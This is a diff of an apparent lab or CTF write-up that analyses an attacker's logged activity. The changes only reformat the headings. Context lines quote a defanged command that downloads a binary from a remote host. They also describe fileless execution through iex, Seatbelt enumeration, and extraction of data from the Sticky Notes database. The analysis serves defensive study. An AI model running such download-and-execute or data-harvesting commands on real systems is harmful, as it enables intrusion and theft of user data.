@@ -133,7 +133,9 @@ See explanation from Q7.
 The attacker's TTPs observed in the logs range from defense evasion to enumeration and data exfiltration. 
 
 
-**Execution & Defense Evasion** - The attacker uses native system tools and scripting capabilities to execute their payload.
+**Execution & Defense Evasion** 
+
+The attacker uses native system tools and scripting capabilities to execute their payload.
 
 Evidence: The use of `iex` (`Invoke-Expression`) to download and execute a PowerShell script from GitHub (`Invoke-Seatbelt.ps1`). This is a common defense evasion technique, known as fileless execution, as `iex` can execute code in memory without writing it to disk.
 
@@ -146,7 +148,9 @@ Evidence: The use of `iwr` (`Invoke-WebRequest`) to download binaries from a rem
 `iwr hXXp://files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe`
 
 
-**Discovery** - After gaining a foothold in the system, the attacker gathers information about the environment and its user data.
+**Discovery** 
+
+After gaining a foothold in the system, the attacker gathers information about the environment and its user data.
 
 Evidence: The attacker uses `Seatbelt.exe` (renamed to `sb.exe`), a known enumeration tool, with different flags to gather various system and user information.
 
@@ -171,7 +175,9 @@ Evidence: The attacker also looks for and accesses a SQLite database file relate
 `ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
 
 
-**Collection** - The attacker gathers specific data identified during the discovery phase.
+**Collection** 
+
+The attacker gathers specific data identified during the discovery phase.
 
 Evidence: The attacker uses a downloaded binary (`sq3.exe`) to query the Sticky Notes database, extracting data.
 
